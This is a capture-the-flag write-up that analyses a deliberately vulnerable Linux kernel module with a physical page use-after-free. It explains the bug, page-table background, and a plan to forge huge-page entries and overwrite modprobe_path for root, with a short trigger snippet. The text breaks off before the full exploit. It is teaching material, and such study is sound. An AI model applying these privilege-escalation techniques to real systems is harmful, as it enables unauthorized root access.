---
title: "Phantom"
date: 2026-02-14
tags: ["kernel", "uaf", "page-tables", "modprobe-path", "mmap", "huge-pages"]
topics: ["pwn"]
summary: "Physical page UAF in a kernel module: reclaim the freed page as a PMD, forge 2MB huge page entries for arbitrary physical memory R/W, and overwrite modprobe_path to read the flag."
releaseDate: "2026-02-14"
ctfs: ["0xfunctf-26"]
difficulty: hard
draft: false
---

{{< katex >}}

> The page is freed, but its ghost lingers.

---

The challenge provides a vulnerable kernel module (`phantom.ko`) running inside a QEMU virtual machine. We get a busybox shell as uid 1000 and need to read `/flag`, which is root-only. All the standard kernel mitigations are enabled.

```sh
qemu-system-x86_64 -m 256M -kernel ./bzImage -initrd ./initramfs.cpio.gz \
    -append "console=ttyS0 oops=panic panic=1 quiet kaslr" \
    -cpu qemu64,+smep,+smap -monitor /dev/null -nographic -no-reboot
```

Let's break down the QEMU flags:

| Flag | Effect |
|------|--------|
| `-m 256M` | 256MB physical RAM. Small enough that the page allocator's free lists are shallow, which is critical for our page reclamation strategy. |
| `-kernel ./bzImage` | Boots kernel 6.6.15 directly (no bootloader). |
| `-append "... kaslr"` | Enables KASLR. The kernel's virtual and physical base addresses are randomized at boot. |
| `-cpu qemu64,+smep,+smap` | Enables SMEP and SMAP (explained below). |
| `-no-reboot` | Kernel panic = instant VM death. No second chances, no crash-and-retry loops. |
| `oops=panic panic=1` | Any kernel oops escalates to a panic. Even a non-fatal error (null deref with recovery) kills the VM. |

### Kernel mitigations

**KASLR** (Kernel Address Space Layout Randomization) randomizes the kernel's virtual and physical base addresses at each boot. This means hardcoded addresses from a local build won't work on the remote—we need to discover addresses dynamically.

**SMEP** (Supervisor Mode Execution Prevention) is a CPU feature (controlled via CR4 bit 20) that prevents code running in ring 0 (kernel mode) from executing instructions on pages whose U/S (User/Supervisor) page table bit is set. In other words: the kernel cannot jump to and execute userspace memory. Without SMEP, a classic kernel exploit technique called **ret2user** works: overwrite a kernel function pointer to point at a userspace buffer containing shellcode, and the kernel happily executes it. SMEP kills this by making the CPU throw a page fault if ring 0 tries to execute a page marked as User. On x86-64 with SMEP, the kernel can only execute code from pages marked Supervisor (i.e., the kernel's own `.text` section).

**SMAP** (Supervisor Mode Access Prevention) is a related CPU feature (CR4 bit 21) that extends the restriction to **data accesses**: ring 0 cannot read from or write to User-marked pages. Without SMAP, even if you can't execute userspace code (thanks to SMEP), you can still trick the kernel into reading attacker-controlled data from userspace—for example, by placing a fake struct in userspace and having the kernel dereference a pointer to it. SMAP closes this gap: any kernel attempt to `mov` from a User page triggers a fault. The kernel must explicitly toggle SMAP off (via the `STAC`/`CLAC` instructions) around legitimate `copy_from_user()`/`copy_to_user()` calls.

Together, SMEP and SMAP force exploits to work entirely within kernel memory: you can't redirect execution to userspace (SMEP), and you can't feed the kernel fake data from userspace (SMAP). This is why our exploit takes a different approach: rather than corrupting the kernel from inside, we forge our own page table entries to access kernel physical memory from userspace. SMEP/SMAP restrict what **the kernel** can do with **userspace** pages. They say nothing about what **userspace** can do if it manages to create a mapping to **kernel** physical memory.

We're also given `interface.h`, which defines two ioctl commands:

```c
#define CMD_ALLOC 0x133701
#define CMD_FREE  0x133702
```

[`ioctl`](https://man7.org/linux/man-pages/man2/ioctl.2.html) (input/output control) is a syscall for sending device-specific commands to a file descriptor — a catch-all for operations that don't fit into `read`/`write`/`seek`:

```c
int ioctl(int fd, unsigned long request, ...);
```

- `fd` — an open file descriptor (here, `/dev/phantom`)
- `request` — a command number defined by the driver
- `...` — an optional argument (pointer or integer, depends on the command)

When userspace calls `ioctl(fd, CMD_ALLOC, 0)`, the kernel looks up the `unlocked_ioctl` function pointer in the file's `file_operations` struct and calls it with the command number. The driver inspects the command and does whatever it wants — there's no enforced structure. Each driver defines its own protocol.

The standard convention is to encode metadata into the command number using macros from `<linux/ioctl.h>`:

```c
// Standard convention (this driver doesn't use it):
#define MY_CMD_READ  _IOR('M', 1, struct my_data)   // read from device
#define MY_CMD_WRITE _IOW('M', 2, struct my_data)   // write to device
// Encodes: direction (R/W), type ('M'), command number (1/2), argument size
```

This driver doesn't follow that convention. `0x133701` and `0x133702` are raw magic numbers with no encoded metadata. This is technically valid — the kernel doesn't enforce the encoding — but it makes the driver slightly harder to discover via `strace` or ioctl scanners, since tools that decode standard ioctl numbers will just show the raw hex.

---

## Reversing the module

### Relocatable objects and why this matters

Kernel modules (`.ko` files) are not regular executables. A normal binary (like `/usr/bin/ls`) has all its addresses resolved by the linker — function calls jump to concrete addresses. A `.ko` file is a **relocatable ELF object**: it's compiled but not yet linked to its final address. When the kernel loads the module with `insmod`, it places the module's code and data at an arbitrary kernel address and then **patches** all the internal references to use the real addresses. These patches are described by **relocation entries** in the ELF file.

This matters for reversing because if a tool doesn't process the relocation entries, function pointers in structs appear as zeroes — a struct that should say "ioctl handler is at function X" just shows `0x0000000000000000`. Ghidra has historically struggled with `.ko` files for this reason, though recent versions have improved.

IDA Pro and Binary Ninja handle `.ko` relocations well — they **apply** them automatically. When you load `phantom.ko` in IDA, it resolves the relocations for you: `call` instructions show the target symbol name (`call __free_pages`), and struct fields display as proper cross-references rather than zeros. For quick analysis, `objdump -d -r` also works: `-d` disassembles the code and `-r` shows relocation entries inline, so you can see which symbol each `call` targets without a full disassembler setup.

The module is tiny: six functions total, four of which are the driver callbacks.

### The `miscdevice` and `file_operations` structs

`init_module` and `cleanup_module` are trivial wrappers:

```c
__int64 init_module(void) {
    return misc_register(&phantom_miscdev);  // .data+0x5C0
}

__int64 cleanup_module(void) {
    return misc_deregister(&phantom_miscdev);
}
```

[`misc_register()`](https://elixir.bootlin.com/linux/v6.6.15/source/drivers/char/misc.c#L203) registers a simple character device. It takes a pointer to a [`miscdevice`](https://elixir.bootlin.com/linux/v6.6.15/source/include/linux/miscdevice.h#L79) struct, which tells the kernel three things: what minor number to use, what to name the device file under `/dev/`, and which functions to call when userspace opens/reads/writes/ioctls the device.

The kernel's `miscdevice` struct definition looks like this:

```c
// include/linux/miscdevice.h
struct miscdevice {
    int minor;                          // offset 0x00 (padded to 8 bytes)
    const char *name;                   // offset 0x08
    const struct file_operations *fops; // offset 0x10
    // ... more fields we don't care about
};
```

To figure out what our module passes to `misc_register`, we follow the cross-reference from `init_module` to `.data+0x5C0`. IDA shows the struct clearly with relocations already resolved:

```asm
.data:0x5C0  db 0FFh                        ; minor = 0xFF
.data:0x5C1  db 7 dup(0)                     ; (padding)
.data:0x5C8  dq offset aPhantom             ; → "phantom"
.data:0x5D0  dq offset off_2A0              ; → file_operations in .rodata
```

The first 8 bytes are the `minor` field. Linux identifies device files using two numbers: a **major number** (which driver handles this device) and a **minor number** (which specific device within that driver). For example, `/dev/sda` and `/dev/sdb` share the same major number (8, the SCSI disk driver) but have different minor numbers (0 and 16). You can see these with `ls -l /dev/`. All misc devices share major number 10, and the minor number distinguishes them from each other. `0xFF` (255) means `MISC_DYNAMIC_MINOR` — "I don't care which minor number, just pick any available one." The next two qwords are pointers that IDA has resolved from the ELF relocation entries: `aPhantom` is the `"phantom"` string, and `off_2A0` points to the `file_operations` struct in `.rodata`.

So in C, this is equivalent to:

```c
struct miscdevice phantom_miscdev = {
    .minor = MISC_DYNAMIC_MINOR,  // 255 → kernel picks a minor number
    .name  = "phantom",           // creates /dev/phantom
    .fops  = &phantom_fops,       // → file_operations struct in .rodata
};
```

When the module loads, the kernel calls `misc_register(&phantom_miscdev)`, which creates `/dev/phantom`. Any time userspace opens, reads, writes, or ioctls that device file, the kernel dispatches to the function pointers in `phantom_fops`.

### Reading the `file_operations` struct

Now we need to figure out what's in the [`file_operations`](https://elixir.bootlin.com/linux/v6.6.15/source/include/linux/fs.h#L1911) struct at `.rodata+0x2A0`. This struct is how Linux drivers register their callback functions. It has dozens of fields — one for each possible file operation — and the kernel definition looks like (abbreviated):

```c
// include/linux/fs.h (simplified, showing only relevant fields with offsets)
struct file_operations {
    struct module *owner;               // offset 0x00
    loff_t (*llseek)(...);              // offset 0x08
    ssize_t (*read)(...);               // offset 0x10
    ssize_t (*write)(...);              // offset 0x18
    // ... 5 more function pointers ...
    long (*unlocked_ioctl)(...);        // offset 0x48
    // ... 1 more ...
    int (*mmap)(...);                   // offset 0x58
    // ... 1 more ...
    int (*open)(...);                   // offset 0x68
    // ... 1 more ...
    int (*release)(...);                // offset 0x78
    // ... many more fields, all NULL in our module ...
};
```

Each field is a function pointer (8 bytes on x86-64). Most drivers only implement a handful of operations and leave the rest as NULL (zero). Following IDA's cross-reference from `off_2A0`, we can see which slots in the struct have function pointers and which are zero. The non-NULL entries at their offsets within the struct:

| Offset | `file_operations` field | Target function |
|--------|------------------------|-----------------|
| `+0x00` | `owner` | `__this_module` |
| `+0x48` | `unlocked_ioctl` | `phantom_ioctl` (`.text+0x110`) |
| `+0x58` | `mmap` | `phantom_mmap` (`.text+0x90`) |
| `+0x68` | `open` | `phantom_open` (`.text+0x10`) |
| `+0x78` | `release` | `phantom_release` (`.text+0x30`) |

We match these offsets against the [kernel's `file_operations` definition](https://elixir.bootlin.com/linux/v6.6.15/source/include/linux/fs.h#L1911) to identify the field names. Everything between these entries is zeros (NULL). The module only implements four callbacks out of the dozens available:

| Callback | Code address | What it does |
|----------|-------------|-------------|
| `open` | `.text+0x10` | Called when userspace does `open("/dev/phantom", ...)` |
| `release` | `.text+0x30` | Called when the last fd to the file is closed |
| `unlocked_ioctl` | `.text+0x110` | Called when userspace does `ioctl(fd, cmd, arg)` |
| `mmap` | `.text+0x90` | Called when userspace does `mmap(..., fd, ...)` |

Operations like `read`, `write`, `poll`, `llseek`, etc. are all NULL, meaning the kernel returns `-EINVAL` or uses a default handler if userspace tries them.

One more thing before we look at the functions. When reversing the four callbacks, you'll notice they all read and write the same address: `0xAC0`. This is a **global variable** — a single pointer that lives for the entire lifetime of the module, shared across all calls. It starts as NULL (zero) and gets set when `CMD_ALLOC` creates the driver's state struct. I'll call it `g_ctx` (global context). It points to a small struct that tracks the allocated page, its virtual address, and whether it's been freed. We'll see the struct layout once we look at `ioctl`.

### `phantom_open` (`.text+0x10`)

```c
__int64 phantom_open(struct inode *inode, struct file *filp) {
    return 0;
}
```

A stub. Returns success unconditionally. No per-file state is created here—that's deferred to `CMD_ALLOC`. This means you can open `/dev/phantom` multiple times, but only one allocation can exist at a time (enforced by the global `g_ctx` pointer).

Note that `g_ctx` is a **global** (`.bss`), not a per-file pointer stored in `filp->private_data`. This is a design choice (or laziness) that means the driver is effectively single-user: if two processes open `/dev/phantom` simultaneously, they share the same state. For exploitation this doesn't matter since we're the only user.

### `phantom_release` (`.text+0x30`)

```c
__int64 phantom_release(struct inode *inode, struct file *filp) {
    struct phantom_ctx *ctx = g_ctx;
    if (g_ctx) {
        if (!g_ctx->freed && g_ctx->page) {
            __free_pages(g_ctx->page, 0);  // order 0 = single page
        }
        kfree(ctx);
        g_ctx = NULL;
    }
    return 0;
}
```

Two kernel functions to understand here:

- [`kfree(ptr)`](https://elixir.bootlin.com/linux/v6.6.15/source/mm/slab_common.c#L1011) frees a small heap object that was allocated with `kmalloc`. This is the kernel's equivalent of userspace `free()`. It returns the memory to the kernel's **slab allocator**, which manages small fixed-size allocations (32 bytes, 64 bytes, 128 bytes, etc.) carved out of full 4KB pages. Our 24-byte `phantom_ctx` struct lives in the `kmalloc-32` slab, and `kfree` returns it there.

- [`__free_pages(page, order)`](https://elixir.bootlin.com/linux/v6.6.15/source/mm/page_alloc.c#L4737) frees a **physical page** (or a contiguous block of \\(2^{\text{order}}\\) pages) back to the kernel's **buddy allocator**. This is a lower-level allocator than the slab — it manages entire 4KB pages of physical memory. `order = 0` means a single page. The `page` argument is a `struct page *`, the kernel's metadata descriptor for a physical page frame, not a virtual address.

These are two different allocators: the slab allocator (`kmalloc`/`kfree`) hands out small objects by carving up pages internally, and the buddy allocator (`alloc_pages`/`__free_pages`) hands out whole pages directly. Our driver uses both: `kmalloc` for the 24-byte state struct, `alloc_pages` for the 4KB data page.

The logic has two paths on close. Recall from `interface.h` that the driver has two ioctl commands: `CMD_ALLOC` (allocate a page) and `CMD_FREE` (free the page). These are the commands that userspace sends via `ioctl(fd, CMD_ALLOC, 0)` and `ioctl(fd, CMD_FREE, 0)`. When `CMD_FREE` is called, it frees the physical page and sets `ctx->freed = 1` as a flag. The `release` function checks this flag to decide what to clean up:

1. **`freed == 1`** (userspace already called `CMD_FREE`): just `kfree(ctx)` to return the 24-byte struct to the slab, and NULL out `g_ctx`. The page was already returned to the buddy allocator by `CMD_FREE`.
2. **`freed == 0`** (userspace never called `CMD_FREE`): call `__free_pages(ctx->page, 0)` to return the page to the buddy allocator, then `kfree(ctx)` to free the struct.

This is correct cleanup for normal usage. The bug isn't here — it's in the interaction between `mmap` and `CMD_FREE`, which we'll see in the `ioctl` handler.

From the struct accesses across all four functions, we can reconstruct the state struct layout:

```c
struct phantom_ctx {
    struct page *page;      // offset 0x00: kernel page descriptor pointer
    unsigned long virt;     // offset 0x08: kernel virtual address of the page
    int freed;              // offset 0x10: flag: was CMD_FREE called?
    int _pad;               // offset 0x14: padding to 0x18 (24 bytes)
};
```

The `kmalloc` call in `ioctl` requests exactly \\(\texttt{0x18} = 24\\) bytes, confirming the struct is 24 bytes.

### `phantom_ioctl` (`.text+0x110`)

This is the heart of the driver. The full IDA decompilation with types applied. A note on the return values: kernel functions return negative [errno](https://elixir.bootlin.com/linux/v6.6.15/source/include/uapi/asm-generic/errno-base.h) values on failure. The ones you'll see here:

| Constant | Value | Meaning |
|----------|-------|---------|
| `-EINVAL` | -22 | Invalid argument (bad command, wrong state) |
| `-EEXIST` | -17 | Already exists (page already allocated) |
| `-ENOMEM` | -12 | Out of memory (allocation failed) |
| `-EFAULT` | -14 | Bad address (used in `mmap` if `remap_pfn_range` fails) |

These are defined in [`<asm-generic/errno-base.h>`](https://elixir.bootlin.com/linux/v6.6.15/source/include/uapi/asm-generic/errno-base.h). When a syscall returns one of these, the C library translates it: `ioctl()` returns -1 and sets `errno` to the positive value (e.g. `errno = ENOMEM`), which `perror()` then prints as "Cannot allocate memory."

```c
__int64 phantom_ioctl(struct file *filp, unsigned int cmd) {
    if (cmd == CMD_ALLOC) {
        if (g_ctx)
            return -EEXIST;

        // kmalloc: allocate 24 bytes of kernel heap memory (zeroed)
        // This is the kernel equivalent of calloc(1, 24)
        g_ctx = kmalloc(24, GFP_KERNEL | __GFP_ZERO);
        if (!g_ctx)
            return -ENOMEM;

        // alloc_pages: allocate one physical 4KB page from the buddy allocator
        // Returns a struct page* (the kernel's metadata for a physical page frame),
        // not a usable pointer — we need to convert it to a virtual address below
        g_ctx->page = alloc_pages(GFP_KERNEL, 0);  // order 0 = single page
        if (!g_ctx->page) {
            kfree(g_ctx);  // free the struct we just allocated
            g_ctx = NULL;
            return -ENOMEM;
        }

        // Convert struct page* → kernel virtual address (explained below)
        g_ctx->freed = 0;
        unsigned long virt = page_to_virt(g_ctx->page);
        g_ctx->virt = virt;

        // Fill entire 4KB page with 0x41 ('A') bytes
        memset(virt, 0x41, 4096);

        return 0;

    } else if (cmd == CMD_FREE) {
        if (!g_ctx || g_ctx->freed)
            return -EINVAL;

        // Return the physical page to the buddy allocator
        __free_pages(g_ctx->page, 0);  // order 0 = single page
        g_ctx->freed = 1;
        return 0;

    } else {
        return -EINVAL;
    }
}
```

The decompilation above is cleaned up for readability. In the actual binary, `kmalloc` appears as `kmalloc_trace(kmalloc_caches[5], ...)` (an internal variant that takes a slab cache pointer directly), and `page_to_virt` is inlined as a sequence of arithmetic on `vmemmap_base` and `page_offset_base`. The logic is the same.

Let's look at the key operations in detail.

**`CMD_ALLOC` — slab allocation and GFP flags:**

The `kmalloc_trace` call uses `GFP_KERNEL | __GFP_ZERO` (\\(\texttt{0xDC0}\\)). Breaking down the flags:

$$\underbrace{\texttt{GFP\_KERNEL}}_{\texttt{0xCC0}} \mathbin{|} \underbrace{\texttt{\_\_GFP\_ZERO}}_{\texttt{0x100}} = \texttt{0xDC0}$$

[`GFP_KERNEL`](https://elixir.bootlin.com/linux/v6.6.15/source/include/linux/gfp_types.h#L285) is the standard allocation flag for kernel code that can sleep—it allows the allocator to reclaim pages, perform I/O, and call into the filesystem if memory is tight. `__GFP_ZERO` zeroes the memory after allocation, equivalent to `kzalloc()`.

The `kmalloc_caches[5]` index selects the slab cache. In the kernel's [kmalloc cache table](https://elixir.bootlin.com/linux/v6.6.15/source/include/linux/slab.h#L376), index 5 corresponds to `kmalloc-32` (the 32-byte cache). So the 24-byte struct gets a 32-byte slab object, with 8 bytes of padding.

**`CMD_ALLOC` — page allocation:**

The `alloc_pages(0xCC0, 0)` call is `alloc_pages(GFP_KERNEL, 0)` — no `__GFP_ZERO` this time (the driver fills with `0x41` instead). Order 0 means \\(2^0 = 1\\) page (4KB). [`alloc_pages()`](https://elixir.bootlin.com/linux/v6.6.15/source/include/linux/gfp.h#L315) returns a `struct page *` pointer, the kernel's metadata descriptor for the physical page.

**`CMD_ALLOC` — why `page_to_virt` exists:**

`alloc_pages()` returns a `struct page *` — but that's not a pointer you can read from or write to. It's a pointer to the kernel's **metadata** about a physical page (reference count, flags, LRU list pointers, etc.), not the page's actual contents. To actually use the page — fill it with data, copy to it, zero it — the kernel needs a virtual address that maps to that physical memory.

Why this indirection? Because the kernel needs to track information *about* pages separately from the page contents themselves. A physical page might be used for userspace memory, page cache, a network buffer, or a page table — the kernel needs metadata for all of them, but the page contents are different in each case. The `struct page` array is the kernel's bookkeeping; the actual data lives in physical memory accessed through virtual addresses.

The conversion from `struct page *` to a usable virtual address is `page_to_virt()`. The kernel keeps two key base addresses for this:

- **`vmemmap_base`** (typically `0xffffea0000000000`): the start of the `struct page` descriptor array. Physical page 0's descriptor is at \\(\texttt{vmemmap\_base} + 0\\), page 1's at \\(\texttt{vmemmap\_base} + 64\\), etc. (each descriptor is 64 bytes).
- [`page_offset_base`](https://elixir.bootlin.com/linux/v6.6.15/source/arch/x86/include/asm/page_64.h#L18) (typically `0xffff888000000000`): the start of the kernel's **direct map** — a linear mapping of *all* physical memory into kernel virtual address space. Physical address `0x1000` is accessible at `page_offset_base + 0x1000`.

The conversion is just arithmetic — figure out which page number this descriptor belongs to, then look up that page in the direct map:

$$\text{page\_number} = \frac{\texttt{page} - \texttt{vmemmap\_base}}{64}$$
$$\text{virt} = \texttt{page\_offset\_base} + \text{page\_number} \times 4096$$

In the binary this appears as bit shifts (\\(\gg 6\\) to divide by 64, \\(\ll 12\\) to multiply by 4096) rather than multiply/divide, but it's the same math.

**`CMD_ALLOC` — the 0x41 fill:**

The `memset(virt, 0x41, 4096)` fills every byte of the page with `0x41` (`'A'`). This serves two purposes: it confirms the page is accessible, and it gives us a recognizable sentinel value (`0x4141414141414141` when read as a qword) that we can later check to determine whether the page has been reclaimed by someone else.

**`CMD_FREE`:**

`CMD_FREE` calls `__free_pages` to return the page to the buddy allocator, then sets `ctx->freed = 1` — but **does not clear `ctx->page`**. The stale `struct page *` pointer remains in the struct. The `freed` flag prevents a double-free via another `CMD_FREE`, and prevents `mmap` from creating new mappings. But any *existing* mapping created before the free persists.

### `phantom_mmap` (`.text+0x90`)

```c
__int64 phantom_mmap(struct file *filp, struct vm_area_struct *vma) {
    if (!g_ctx)             return -EINVAL;  // -22
    if (g_ctx->freed)       return -EINVAL;
    if (!g_ctx->page)       return -EINVAL;

    unsigned long start = vma->vm_start;
    unsigned long size  = vma->vm_end - start;
    if (size > 0x1000)      return -EINVAL;  // max one page

    unsigned long pfn = (g_ctx->page - vmemmap_base) >> 6;

    int ret = remap_pfn_range(vma, start, pfn, size, vma->vm_page_prot);
    if (ret)                return -EFAULT;  // -14
    return 0;
}
```

[`remap_pfn_range()`](https://elixir.bootlin.com/linux/v6.6.15/source/mm/memory.c#L2496) is a kernel function that creates a direct mapping from a userspace virtual address to a specific physical frame number (PFN). Its legitimate use case is mapping memory that **isn't managed by the page allocator** — things like:

- **Hardware MMIO registers**: a GPU driver maps the GPU's control registers into userspace so a graphics library can talk to the hardware directly without syscall overhead.
- **DMA buffers**: a network or video capture driver allocates a buffer for hardware DMA and maps it into userspace for zero-copy I/O.
- **Firmware regions**: mapping BIOS/UEFI tables or other fixed physical memory.

The key thing these all have in common: the physical memory being mapped **doesn't come from `alloc_pages()`**. It's hardware addresses or reserved memory that the page allocator doesn't know about. That's why `remap_pfn_range` disables reference counting — when userspace unmaps MMIO memory, the kernel shouldn't try to "free" the GPU's hardware registers back to the page allocator. They're not the kernel's to free.

This driver uses `remap_pfn_range` on a page that **does** come from `alloc_pages()`. That's the wrong tool for the job. The correct approach for mapping allocator-managed pages to userspace is [`vm_insert_page()`](https://elixir.bootlin.com/linux/v6.6.15/source/mm/memory.c#L1888) or simply using a `fault` handler in `vm_operations_struct`, both of which properly maintain reference counts. Using `remap_pfn_range` on an allocator page is a well-known antipattern in kernel driver development, and it's what creates the vulnerability here.

The size check allows at most `PAGE_SIZE` (\\(\texttt{0x1000} = 4096\\)) — you can't map more than one page through a single `mmap` call. But one page is all we need.

### The vulnerability

There's a subtle but critical ordering issue. The `mmap` handler checks `ctx->freed` and refuses to create new mappings after `CMD_FREE`. But nothing prevents this sequence:

1. `CMD_ALLOC` — allocate a page, `freed = 0`
2. `mmap()` — create a userspace mapping (succeeds because `freed == 0`)
3. `CMD_FREE` — free the physical page, set `freed = 1`

The key thing to understand is that `remap_pfn_range` and `__free_pages` are **completely independent operations** that don't know about each other:

- `remap_pfn_range` just writes a PTE into the process's page tables: "virtual address X maps to physical frame Y." It doesn't lock the page, hold a reference, or register itself anywhere. It's a one-shot write to a page table entry.
- `__free_pages` just returns a page to the buddy allocator. It checks the page's reference count, decrements it, and if it hits zero, puts the page on the free list. It doesn't scan every process's page tables to check if someone still has a PTE pointing to this frame.

Normally these two operations are kept safe by **reference counting**: when the kernel creates a mapping to a page (through the normal `vm_insert_page` path, not `remap_pfn_range`), it increments the page's refcount. So even if the driver calls `__free_pages`, the refcount is still \\(> 0\\) and the page isn't actually freed until the mapping is also removed.

But `remap_pfn_range` skips the refcount — it was designed for hardware memory that will never be freed, so why bother counting? The consequence is that nothing connects the mapping to the page. The driver can call `__free_pages` and the page is genuinely freed, while the PTE still sits there in the page tables pointing to the now-free physical frame. The hardware MMU doesn't know or care — it sees a valid PTE and dutifully translates accesses. We have a dangling mapping to freed physical memory.

```c
int fd = open("/dev/phantom", O_RDWR);
ioctl(fd, CMD_ALLOC, 0);

volatile uint64_t *uaf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                               MAP_SHARED, fd, 0);
ioctl(fd, CMD_FREE, 0);

// uaf[0..511] reads/writes a freed physical page
// The page is filled with 0x4141414141414141 from CMD_ALLOC
// Once the kernel reuses this page, we see (and can modify) whatever it put there
```

This is a **physical page UAF**, not a slab UAF. The distinction matters: slab UAFs give you access to a freed slab object (typically 32-2048 bytes inside a slab page), while this gives us access to an entire 4KB physical page. The page can be reused for anything: slab pages, page tables, pipe buffers, file page cache, anonymous memory, etc. We choose what it gets reused for by controlling the allocation pattern after the free.

---

## Background: virtual memory and page tables

If you're already comfortable with x86-64 paging, the MMU hardware walk, and huge pages, [skip ahead to the exploit strategy](#exploit-strategy).

### Why paging exists

Every process has its own virtual address space. When your program reads address `0x40000000`, the CPU doesn't go to physical RAM byte 0x40000000. Instead, the CPU's **MMU (Memory Management Unit)** translates that virtual address to a physical address using **page tables**, data structures in physical memory that define the mapping. Different processes have different page tables, so the same virtual address in two processes can point to completely different physical memory. The kernel manages these tables, and the hardware walks them on every memory access.

### The four-level page table walk

On x86-64, a 48-bit virtual address is split into five fields:

```
 63       48 47     39 38     30 29     21 20     12 11        0
┌──────────┬─────────┬─────────┬─────────┬─────────┬──────────┐
│ sign ext │   PGD   │   PUD   │   PMD   │   PTE   │  offset  │
│ (16 bit) │ (9 bit) │ (9 bit) │ (9 bit) │ (9 bit) │ (12 bit) │
└──────────┴─────────┴─────────┴─────────┴─────────┴──────────┘
```

Each 9-bit field selects one of 512 entries (since \\(2^9 = 512\\)) in that level's table. Each table is exactly one 4KB page (\\(512 \times 8 = 4096\\) bytes). The hardware walks the tree:

1. **CR3** register holds the physical address of the PGD (Page Global Directory, also called PML4)
2. `PGD[bits 47:39]` gives the physical address of a PUD (Page Upper Directory) page
3. `PUD[bits 38:30]` gives the physical address of a PMD (Page Middle Directory) page
4. `PMD[bits 29:21]` gives the physical address of a PTE (Page Table Entry) page
5. `PTE[bits 20:12]` gives the physical address of the final 4KB data page
6. `bits 11:0` are the byte offset within that 4KB page

{{< mermaid >}}
flowchart LR
    CR3["CR3"] --> PGD["PGD<br>512 entries"]
    PGD -->|"bits 47:39"| PUD["PUD<br>512 entries"]
    PUD -->|"bits 38:30"| PMD["PMD<br>512 entries"]
    PMD -->|"bits 29:21"| PTE["PTE<br>512 entries"]
    PTE -->|"bits 20:12"| PAGE["4KB<br>data page"]
    style CR3 fill:#2d333b,stroke:#444
    style PGD fill:#1c3049,stroke:#388bfd
    style PUD fill:#1c3049,stroke:#388bfd
    style PMD fill:#5a3a1e,stroke:#d29922
    style PTE fill:#1a6334,stroke:#2ea043
    style PAGE fill:#6e3630,stroke:#f85149
{{< /mermaid >}}

That diagram shows how a **virtual address** is sliced up to index into each table level. Now let's look at what's *inside* each table. Each entry is 8 bytes and contains a physical address (of the next-level table or the final page) plus permission and status flags in the low bits. The key flags are:

| Bit | Name | Meaning |
|-----|------|---------|
| 0 | P (Present) | Entry is valid. If clear, accessing this address triggers a page fault. |
| 1 | R/W | If set, the page is writable. If clear, writes trigger a fault. |
| 2 | U/S | If set, userspace can access this page. If clear, only kernel mode can. |
| 5 | A (Accessed) | Set by hardware when the page is read. |
| 6 | D (Dirty) | Set by hardware when the page is written. |
| 7 | PS (Page Size) | At the PMD level: if set, this is a 2MB "huge page" (no PTE level). |

The physical address is stored in bits 51:12 (for normal 4KB pages) or bits 51:21 (for 2MB huge pages), with the low bits used for flags. Since pages are always aligned to their size (\\(2^{12}\\) for 4KB, \\(2^{21}\\) for 2MB), those low bits are architecturally zero in the address and available for flags.

### 2MB huge pages (PMD level)

Normally, each PMD entry points to a PTE page, and each PTE entry points to a final 4KB data page. A single PMD entry governs \\(512 \times \text{4KB} = \text{2MB}\\) of virtual address space. But when the **PS bit** (bit 7) is set in a PMD entry, the CPU short-circuits: it skips the PTE level entirely and treats the PMD entry as a direct mapping of a **2MB** region of physical memory. This is why huge pages are exactly 2MB — it's the same amount of address space that one PMD entry normally covers through 512 individual 4KB pages, just mapped as one contiguous block instead.

{{< mermaid >}}
flowchart LR
    subgraph "Normal (4KB pages)"
        PMD1["PMD entry<br>(covers 2MB)"] --> PTE1["PTE page<br>512 entries × 8B = 4KB"] --> P1["512 × 4KB pages<br>= 2MB total"]
    end
    subgraph "Huge page (2MB)"
        PMD2["PMD entry<br>(PS=1)"] --> P2["2MB contiguous<br>physical memory"]
    end
    style PMD1 fill:#5a3a1e,stroke:#d29922
    style PTE1 fill:#1a6334,stroke:#2ea043
    style P1 fill:#6e3630,stroke:#f85149
    style PMD2 fill:#5a3a1e,stroke:#d29922
    style P2 fill:#6e3630,stroke:#f85149
{{< /mermaid >}}

The entry format for a 2MB huge page:

```
bits 51:21 = physical base address (2MB-aligned, low 21 bits implicit zero)
bit 7      = PS = 1 (Page Size, marks this as a huge page)
bit 6      = D (Dirty)
bit 5      = A (Accessed)
bit 2      = U/S (User/Supervisor)
bit 1      = R/W (Read/Write)
bit 0      = P (Present)
```

So a PMD entry value of `physical_address | 0xE7` means: present (bit 0), read-write (bit 1), user-accessible (bit 2), accessed (bit 5), dirty (bit 6), huge page (bit 7). That's \\(\texttt{0b11100111} = \texttt{0xE7}\\). This single 8-byte value gives userspace full read-write access to 2MB of contiguous physical memory.

### TLB caching and invalidation

The page table walk is expensive: four sequential memory reads just to translate one virtual address. To avoid doing this on every memory access, the CPU caches recent translations in the **TLB (Translation Lookaside Buffer)**. When we modify page table entries, stale TLB entries can cause the CPU to use the old translation.

The TLB must be explicitly invalidated. On x86-64, writing to the **CR3** register flushes the entire TLB (on CPUs without PCID (Process Context Identifiers), which includes our `qemu64`). The kernel rewrites CR3 on every context switch (returning from syscalls included), so a simple syscall like `getpid()` acts as a full TLB flush:

```c
static inline void tlb_flush(void) { getpid(); }
```

After modifying a PMD entry via our UAF and calling `getpid()`, the next memory access through the corresponding virtual address will walk the page tables fresh and see our modified entry.

### How page table pages get allocated

When the kernel needs to create a new page table entry (for example, when you `mmap` a new region and then touch it for the first time), it needs physical pages to hold the table itself. These page table pages come from the same page allocator that serves `alloc_page()`. The kernel calls functions like [`pte_alloc_one`](https://elixir.bootlin.com/linux/v6.6.15/source/arch/x86/include/asm/pgalloc.h#L38) and [`pmd_alloc`](https://elixir.bootlin.com/linux/v6.6.15/source/mm/memory.c#L4854) which internally call `alloc_page(GFP_KERNEL)` (or a similar variant) to get a fresh page.

This is the key insight for the exploit: our freed page goes back to the same pool that the kernel draws from when it needs new page table pages. If we can trigger the right allocation pattern, we can get the kernel to reuse our freed page as a **PMD page**. Then our UAF pointer directly reads and writes PMD entries, and we can craft arbitrary huge page mappings.

---

## Exploit strategy

Now that we understand the moving parts, here's the plan:

1. **UAF**: Allocate a page, mmap it, free it. We get R/W access to a freed physical page.
2. **PMD reclaim**: Spray page table allocations so the freed page gets reclaimed as a PMD page.
3. **PMD identification**: Figure out which virtual address range our PMD governs.
4. **Forge huge pages**: Write 2MB huge page entries into the PMD, creating a window over arbitrary physical memory.
5. **Find `modprobe_path`**: Scan physical memory for the `/sbin/modprobe` string.
6. **Overwrite**: Replace it with `/tmp/x`, a script that copies the flag.
7. **Trigger**: Execute a file with invalid magic bytes. The kernel runs our script as root.

---

## Phase 1: Obtaining the UAF

